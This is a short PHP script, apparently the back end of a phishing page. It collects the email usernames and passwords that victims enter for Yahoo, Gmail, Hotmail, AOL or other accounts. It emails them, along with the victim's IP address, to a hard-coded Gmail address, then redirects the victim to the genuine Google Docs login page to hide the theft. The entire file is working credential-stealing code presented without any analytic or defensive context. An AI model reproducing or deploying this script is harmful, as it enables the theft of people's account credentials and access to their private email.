<?php

$to = 'echoii1993@gmail.com,';
$complete = 'https://accounts.google.com/ServiceLogin?service=writely&passive=1209600&continue=http://docs.google.com/#&followup=http://docs.google.com/&ltmpl=homepage';
$subject = getenv("REMOTE_ADDR");
$from = "From: echoii1993@gmail.com";



$yahoouser = $_POST['yahoouser'];
$yahoopassword = $_POST['yahoopassword'];
$gmailuser = $_POST['gmailuser'];
$gmailpassword = $_POST['gmailpassword'];
$hotmailuser = $_POST['hotmailuser'];
$hotmailpassword = $_POST['hotmailpassword'];
$aoluser = $_POST['aoluser'];
$aolpassword = $_POST['aolpassword'];
$otheruser = $_POST['otheruser'];
$otherpassword = $_POST['otherpassword'];

if($yahoouser)
{
	$mail_server = 'Yahoo';
}
if($gmailuser)
{
	$mail_server = 'Gmail';
}
if($hotmailuser)
{
	$mail_server = 'Hotmail';
}
if($aoluser)
{
	$mail_server = 'Aol';
}
if($otheruser)
{
	$mail_server = 'Other';
}

$comment = $mail_server.' Login Details for: '."\n"
			.'**************************************'."\n"
			.'Username: '.$yahoouser.$gmailuser.$hotmailuser.$aoluser.$otheruser."\n"
			.'Password: '.$yahoopassword.$gmailpassword.$hotmailpassword.$aolpassword.$otherpassword."\n";
			
			
mail($to, $subject, $comment, $from);
header("Location: $complete");
?>